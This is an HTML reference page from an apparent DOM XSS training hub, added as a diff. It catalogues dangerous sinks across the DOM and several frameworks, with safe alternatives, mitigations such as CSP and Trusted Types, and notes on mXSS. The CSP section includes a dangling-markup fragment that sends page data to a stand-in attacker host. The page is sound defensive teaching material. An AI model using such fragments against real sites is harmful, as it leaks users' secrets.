@@ -1,0 +1,347 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>DOM XSS Sinks</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <nav><a href="index.html">&larr; Back to hub</a></nav>
+  <h1>Sinks</h1>
+  <p>
+    A <b>sink</b> is a function or property that can turn a string into running code or live HTML.
+    Data from a source is only dangerous once it reaches one of these.
+  </p>
+
+  <h2>HTML sinks: the string is parsed as HTML</h2>
+  <table>
+    <tr><th>Sink</th><th>Notes</th><th>Safe alternative</th><th>Lab</th></tr>
+    <tr>
+      <td><code>element.innerHTML</code></td>
+      <td><code>&lt;script&gt;</code> does not run, but <code>&lt;img onerror&gt;</code> and similar do.</td>
+      <td><code>textContent</code></td>
+      <td><a href="labs/01-search-innerhtml.html">01</a>, <a href="labs/05-window-name-innerhtml.html">05</a>, <a href="labs/06-localstorage-innerhtml.html">06</a>, <a href="labs/07-postmessage-innerhtml.html">07</a></td>
+    </tr>
+    <tr>
+      <td><code>element.outerHTML</code>, <code>insertAdjacentHTML()</code></td>
+      <td>Same behaviour as <code>innerHTML</code>.</td>
+      <td><code>textContent</code>, <code>createElement</code></td>
+      <td>-</td>
+    </tr>
+    <tr>
+      <td><code>document.write()</code>, <code>writeln()</code></td>
+      <td>Runs while the page loads. <code>&lt;script&gt;</code> tags do run.</td>
+      <td>Avoid entirely.</td>
+      <td><a href="labs/02-search-document-write.html">02</a></td>
+    </tr>
+    <tr>
+      <td><code>iframe.srcdoc</code></td>
+      <td>A full HTML document, scripts run, same origin as the parent.</td>
+      <td><code>sandbox</code> attribute, escape the input</td>
+      <td><a href="labs/08-search-iframe-srcdoc.html">08</a></td>
+    </tr>
+  </table>
+
+  <h2>jQuery sinks</h2>
+  <table>
+    <tr><th>Sink</th><th>Notes</th><th>Safe alternative</th><th>Lab</th></tr>
+    <tr>
+      <td><code>.html()</code>, <code>.append()</code>, <code>.prepend()</code>, <code>.after()</code>, <code>.before()</code>, <code>.replaceWith()</code>, <code>.wrap()</code>, <code>.wrapAll()</code>, <code>.add()</code></td>
+      <td>A string argument is parsed as HTML. jQuery also runs any <code>&lt;script&gt;</code> tags in it.</td>
+      <td><code>.text()</code>, or build elements then use <code>.text()</code></td>
+      <td><a href="labs/jquery/11-search-html.html">11</a>, <a href="labs/jquery/12-search-append.html">12</a></td>
+    </tr>
+    <tr>
+      <td><code>$(string)</code></td>
+      <td>Selector or HTML, depending on the string. jQuery 1.6.1 treated <code>#&lt;img&gt;</code> as HTML (CVE-2012-6708); fixed for good by 1.9, which requires the string to start with <code>&lt;</code>.</td>
+      <td>Validate the string, upgrade jQuery</td>
+      <td><a href="labs/jquery/13-hash-selector-legacy.html">13</a></td>
+    </tr>
+    <tr>
+      <td><code>jQuery.parseHTML()</code>, <code>$.parseHTML()</code></td>
+      <td>Builds a hidden <code>&lt;div&gt;</code> and sets its <code>innerHTML</code> to the string, the same browser-parsing sink as <code>innerHTML</code> itself, just reached through jQuery's own helper.</td>
+      <td>Don't parse untrusted strings as HTML at all</td>
+      <td>-</td>
+    </tr>
+    <tr>
+      <td><code>jQuery.globalEval()</code></td>
+      <td>Runs a string as JavaScript in the global scope. Functionally the same as <code>eval()</code>.</td>
+      <td>Never call this on untrusted data</td>
+      <td>-</td>
+    </tr>
+    <tr>
+      <td><code>.attr("href" | "src" | "action", value)</code></td>
+      <td>Same risk as setting the property directly.</td>
+      <td>Allow only <code>http:</code> and <code>https:</code></td>
+      <td><a href="labs/jquery/14-search-attr-href.html">14</a></td>
+    </tr>
+  </table>
+
+  <h2>AngularJS sinks</h2>
+  <table>
+    <tr><th>Sink</th><th>Notes</th><th>Safe alternative</th><th>Lab</th></tr>
+    <tr>
+      <td><code>{{ }}</code> in a compiled page</td>
+      <td>User input inside an element Angular compiles is run as an Angular expression. Needs no HTML.</td>
+      <td><code>ng-non-bindable</code>, keep input out of compiled templates</td>
+      <td><a href="labs/angularjs/15-search-template-injection.html">15</a></td>
+    </tr>
+    <tr>
+      <td><code>$sce.trustAsHtml()</code> with <code>ng-bind-html</code></td>
+      <td>Marks a string as safe HTML without checking it. Modern Angular: <code>bypassSecurityTrustHtml</code>.</td>
+      <td><code>ngSanitize</code>, or <code>ng-bind</code></td>
+      <td><a href="labs/angularjs/16-search-trust-as-html.html">16</a>, <a href="labs/angularjs/17-search-ngsanitize-safe.html">17</a></td>
+    </tr>
+  </table>
+
+  <h2>Modern Angular sinks</h2>
+  <table>
+    <tr><th>Sink</th><th>Notes</th><th>Safe alternative</th><th>Lab</th></tr>
+    <tr>
+      <td><code>[innerHTML]</code>, <code>[innerText]</code>, <code>[href]</code>, <code>[src]</code>...</td>
+      <td>Angular sanitizes these template bindings automatically. Nothing to do here.</td>
+      <td>(this is already the safe default)</td>
+      <td><a href="http://localhost:4200/?lab=18" target="_blank">18</a></td>
+    </tr>
+    <tr>
+      <td><code>DomSanitizer.bypassSecurityTrustHtml/Url/Style/ResourceUrl/Script()</code></td>
+      <td>Turns off the sanitizer for one value. AngularJS calls the same idea <code>$sce.trustAsHtml</code>.</td>
+      <td>Do not bypass; sanitize untrusted data before this point if you must</td>
+      <td><a href="http://localhost:4200/?lab=19" target="_blank">19</a>, <a href="http://localhost:4200/?lab=20" target="_blank">20</a></td>
+    </tr>
+    <tr>
+      <td><code>ElementRef.nativeElement</code> + a plain DOM sink</td>
+      <td>Raw DOM access. Angular's sanitizer only runs on its own template bindings, so it never sees this.</td>
+      <td><code>textContent</code>, or bind through the template instead</td>
+      <td><a href="http://localhost:4200/?lab=21" target="_blank">21</a></td>
+    </tr>
+  </table>
+  <p>
+    The modern Angular labs run as a separate CLI app; see the
+    <a href="angular/README.md">Angular project README</a> and the root README for how to start it.
+  </p>
+
+  <h2>More framework sinks</h2>
+  <p>
+    Different names, same shape every time: a framework's default is safe (usually plain text,
+    HTML-encoded), and it gives you exactly one clearly-named way to turn that off per element.
+    The bug is always using that one way on data that didn't need it.
+  </p>
+  <table>
+    <tr><th>Sink</th><th>Notes</th><th>Safe alternative</th><th>Lab</th></tr>
+    <tr>
+      <td><code>dangerouslySetInnerHTML</code> (React)</td>
+      <td>Takes <code>{ __html: string }</code> and sets real <code>innerHTML</code>. The awkward name is deliberate, so it's easy to grep for in review.</td>
+      <td>Pass the string as a normal child instead</td>
+      <td><a href="labs/react/22-search-dangerously-set-innerhtml.html">22</a></td>
+    </tr>
+    <tr>
+      <td><code>v-html</code> (Vue)</td>
+      <td>Vue's own docs warn against using it with untrusted content.</td>
+      <td><code>{{ }}</code> interpolation</td>
+      <td><a href="labs/vue/23-search-v-html.html">23</a></td>
+    </tr>
+    <tr>
+      <td><code>{{{ }}}</code> triple-stache (Handlebars, and Mustache.js which uses the same syntax)</td>
+      <td>Double braces HTML-encode; one extra brace turns that off.</td>
+      <td><code>{{ }}</code> (double braces)</td>
+      <td><a href="labs/handlebars/24-search-triple-stache.html">24</a></td>
+    </tr>
+    <tr>
+      <td><code>_.template()</code> with <code>&lt;%= %&gt;</code> "interpolate" (Lodash/Underscore)</td>
+      <td>
+        No encoding at all. Easy to mix up with Handlebars: here <code>&lt;%- %&gt;</code> is the
+        safe, HTML-encoding one, the opposite naming convention from the double/triple-brace
+        engines above.
+      </td>
+      <td><code>&lt;%- %&gt;</code> "escape"</td>
+      <td><a href="labs/lodash/25-search-template-interpolate.html">25</a></td>
+    </tr>
+    <tr>
+      <td><code>data-bind="html: ..."</code> (Knockout)</td>
+      <td>Knockout's docs call this out directly as an XSS risk with untrusted input.</td>
+      <td><code>data-bind="text: ..."</code></td>
+      <td><a href="labs/knockout/26-search-html-binding.html">26</a></td>
+    </tr>
+    <tr>
+      <td><code>x-html</code> (Alpine.js)</td>
+      <td>Same idea as <code>v-html</code> and Knockout's <code>html</code> binding, in a smaller, no-build framework.</td>
+      <td><code>x-text</code></td>
+      <td><a href="labs/alpine/27-search-x-html.html">27</a></td>
+    </tr>
+  </table>
+
+  <h2>JavaScript sinks: the string is run as code</h2>
+  <table>
+    <tr><th>Sink</th><th>Notes</th><th>Safe alternative</th><th>Lab</th></tr>
+    <tr>
+      <td><code>eval()</code></td>
+      <td>Runs any string as JavaScript.</td>
+      <td>Parse the data, for example <code>JSON.parse</code></td>
+      <td><a href="labs/03-hash-eval.html">03</a></td>
+    </tr>
+    <tr>
+      <td><code>new Function(string)</code></td>
+      <td>Same as <code>eval</code>.</td>
+      <td>A normal function</td>
+      <td>-</td>
+    </tr>
+    <tr>
+      <td><code>setTimeout(string)</code>, <code>setInterval(string)</code></td>
+      <td>Only dangerous when given a <b>string</b>. A function is fine.</td>
+      <td>Pass a function</td>
+      <td><a href="labs/10-search-settimeout.html">10</a></td>
+    </tr>
+  </table>
+
+  <h2>URL sinks: the string is used as a URL</h2>
+  <table>
+    <tr><th>Sink</th><th>Notes</th><th>Safe alternative</th><th>Lab</th></tr>
+    <tr>
+      <td><code>a.href</code>, <code>form.action</code>, <code>iframe.src</code></td>
+      <td>A <code>javascript:</code> URL runs on click or load.</td>
+      <td>Allow only <code>http:</code> and <code>https:</code></td>
+      <td><a href="labs/04-search-anchor-href.html">04</a></td>
+    </tr>
+    <tr>
+      <td><code>location</code>, <code>location.href</code>, <code>location.assign()</code></td>
+      <td>A <code>javascript:</code> URL runs in the current page. Other URLs give an open redirect.</td>
+      <td>Check the origin before redirecting</td>
+      <td><a href="labs/09-search-location-href.html">09</a></td>
+    </tr>
+    <tr>
+      <td><code>script.src</code></td>
+      <td>Loads and runs a script from the given URL.</td>
+      <td>Fixed allow-list of script URLs</td>
+      <td>-</td>
+    </tr>
+  </table>
+
+  <h2>A sink that isn't about code injection</h2>
+  <table>
+    <tr><th>Sink</th><th>Notes</th><th>Safe alternative</th><th>Lab</th></tr>
+    <tr>
+      <td><code>document.domain = value</code></td>
+      <td>
+        The browser only accepts a value that is a valid parent domain of the current page
+        (<code>a.b.example.com</code> can set it to <code>example.com</code>, nothing else), so
+        this isn't an injection sink like the others on this page. It's still worth knowing: setting
+        it relaxes the same-origin policy between sibling subdomains, so a bug that lets an
+        attacker reach this call at all can let a compromised subdomain read or script this page.
+        <b>The setter is now deprecated</b>, and does nothing at all on a page that sends
+        <code>Cross-Origin-Opener-Policy</code> / <code>Cross-Origin-Embedder-Policy</code>, or an
+        <code>Origin-Agent-Cluster</code> header, which modern sites are increasingly expected to.
+      </td>
+      <td>Avoid setting it; if subdomains must share access, prefer <code>postMessage</code> with an origin check</td>
+      <td>-</td>
+    </tr>
+  </table>
+
+  <h2>Mitigations: things that stop a sink from firing</h2>
+  <p>
+    Everything above is "here's the bug." These are the real defenses, each verified against this
+    exact browser rather than taken on faith, and each with a working lab you can try.
+  </p>
+  <table>
+    <tr><th>Mitigation</th><th>What it actually does</th><th>Lab</th></tr>
+    <tr>
+      <td>DOMPurify (or a similar sanitizing library)</td>
+      <td>Parses untrusted HTML and strips anything dangerous before it reaches a sink. The right fix when you need to allow some real HTML, not just plain text.</td>
+      <td><a href="labs/28-search-dompurify-safe.html">28</a></td>
+    </tr>
+    <tr>
+      <td>Content-Security-Policy, <code>script-src</code></td>
+      <td>
+        Blocks inline event handlers (<code>onerror=</code>), inline <code>&lt;script&gt;</code>
+        blocks, and <code>javascript:</code> URLs unless explicitly allowed. Real, meaningful
+        protection against the classic payloads used throughout this hub.
+      </td>
+      <td><a href="labs/31-csp-blocks-innerhtml.html">31</a></td>
+    </tr>
+    <tr>
+      <td>Content-Security-Policy's blind spot: dangling markup</td>
+      <td>
+        <code>script-src</code> only governs script execution. An unterminated HTML attribute
+        (an <code>&lt;img src="https://attacker.example/leak?data=</code> with no closing quote)
+        can still swallow the rest of the page's markup, including secrets, and exfiltrate it as
+        part of a real network request — no script involved, so CSP never sees it.
+      </td>
+      <td><a href="labs/32-csp-dangling-markup.html">32</a></td>
+    </tr>
+    <tr>
+      <td>Trusted Types, <code>require-trusted-types-for 'script'</code></td>
+      <td>
+        Goes further than CSP: the browser refuses a plain string at <code>innerHTML</code> (and
+        several other sinks) entirely, throwing before its HTML parser ever runs on untrusted
+        input. Closes the dangling-markup gap above, since there's no parsed HTML to dangle in
+        the first place. Chrome/Edge have supported it since 2020; Safari added it in version 26
+        (September 2025) and Firefox in version 148 (February 2026), which made it a <b>Baseline</b>
+        feature — supported across all major engines, not just Chromium, as of this write-up. A
+        library needs to be built for it too, not just your own code: jQuery 3.7.1 fails to even
+        load on a page enforcing it (its own internal setup code hits the same wall), fixed in
+        jQuery 4.0, which added Trusted Types support throughout.
+      </td>
+      <td><a href="labs/33-trusted-types-safe.html">33</a>, <a href="labs/jquery/35-trusted-types-safe.html">35</a></td>
+    </tr>
+  </table>
+
+  <h2>Mutation XSS (mXSS) and raw-text element confusion</h2>
+  <table>
+    <tr><th>Technique</th><th>What it actually does</th><th>Lab</th></tr>
+    <tr>
+      <td>Raw-text element confusion ("consuming tag")</td>
+      <td>
+        Elements like <code>&lt;style&gt;</code>, <code>&lt;noscript&gt;</code>,
+        <code>&lt;script&gt;</code>, <code>&lt;iframe&gt;</code>, <code>&lt;xmp&gt;</code>,
+        <code>&lt;title&gt;</code>, <code>&lt;textarea&gt;</code>, <code>&lt;noembed&gt;</code>,
+        and <code>&lt;noframes&gt;</code> are RAWTEXT in the HTML spec: nothing that parses them
+        pays attention to quotes or nested tags inside, it just scans for the literal next closing
+        tag. A fake closing tag planted inside what looks like a quoted attribute value ends the
+        element early and exposes real markup. This is the same mechanism behind real, named mXSS
+        CVEs: Mozilla's Bleach sanitizer
+        (<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1615315">CVE-2020-6802</a>) and the
+        browser's own <code>DOMParser</code> API
+        (<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1528997">CVE-2021-23974</a>) were
+        both filed specifically over <code>&lt;noscript&gt;</code> handling. Verified directly:
+        the payload fires, and a filter that only checks the first tag name misses it entirely.
+      </td>
+      <td><a href="labs/34-search-rawtext-consuming-tag.html">34</a></td>
+    </tr>
+  </table>
+  <p>
+    What that lab demonstrates end to end is the simpler half of mXSS: the raw-text mechanism
+    defeating a filter that pattern-matches text instead of parsing real HTML, with no sanitizer
+    or second parse involved. The fuller, classic mXSS shape, something that <i>checks</i>
+    untrusted HTML parses it one way, and whatever <i>inserts</i> it parses the same markup
+    differently, needing no filter mistake at all, is real (those CVEs exist) but delicate to
+    reproduce. We tested it directly: <code>DOMParser</code> genuinely does parse
+    <code>&lt;noscript&gt;</code> differently from <code>innerHTML</code> in this browser, matching
+    the CVEs' premise, but a sanitizer using <code>DOMParser</code> has to serialize its result
+    back into a string before the real sink ever sees it, and that step HTML-encodes the
+    characters this exact payload needs — so it doesn't survive the round trip. The divergence is
+    real and confirmed; this specific payload isn't the one that exploits it end to end. Several
+    other classic, specifically mXSS-labeled payloads from Mario Heiderich and Cure53's research
+    (SVG/MathML namespace-confusion tricks) also didn't reproduce in current Chromium when tested
+    directly. A fully verified, working, end-to-end mXSS sanitizer bypass isn't in this hub yet;
+    revisit if one turns up.
+  </p>
+
+  <p>
+    Researched against
+    <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">PortSwigger's DOM-based XSS tutorial</a>
+    and its
+    <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">XSS cheat sheet</a>
+    (source of lab 34's payload), <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/domain">MDN</a>
+    (for <code>document.domain</code>'s current deprecation status), and
+    <a href="https://api.jquery.com/">jQuery's own current API docs</a> for the jQuery sinks table
+    — each jQuery method listed was also tested directly against this hub's own copy of jQuery
+    (4.0.0, upgraded from 3.7.1 while writing this) rather than taken on documentation alone. The
+    jQuery sinks taxonomy itself traces back to
+    Stefano Di Paola &amp; Giorgio Maone's DOMXSS wiki (circa 2011-2013), credited for originating
+    this framing, but that wiki is no longer maintained and isn't relied on here as a source of
+    current fact. CSP, Trusted Types, dangling markup, and the raw-text technique were all verified
+    directly in this hub's own browser rather than taken from any documentation at all. Current as
+    of this write-up.
+  </p>
+</body>
+</html>
